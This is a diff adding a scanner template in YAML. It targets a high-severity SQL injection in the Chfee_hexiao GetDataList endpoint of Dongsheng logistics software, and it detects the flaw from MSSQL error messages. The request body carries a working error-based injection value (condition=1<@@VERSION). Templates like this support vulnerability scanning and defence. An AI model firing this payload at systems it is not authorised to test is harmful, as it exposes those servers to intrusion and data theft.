@@ -1,0 +1,28 @@
+id: poc-yaml-dongshengsoft-chfee-hexiao-sqli
+info:
+  name: 东胜物流软件 Chfee_hexiao SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - method: POST
+    path:
+      - /Account/Chfee_hexiao/GetDataList
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: start=0&condition=1%3C@@VERSION&limit=10
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "Microsoft SQL Server"
+          - "SqlException"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
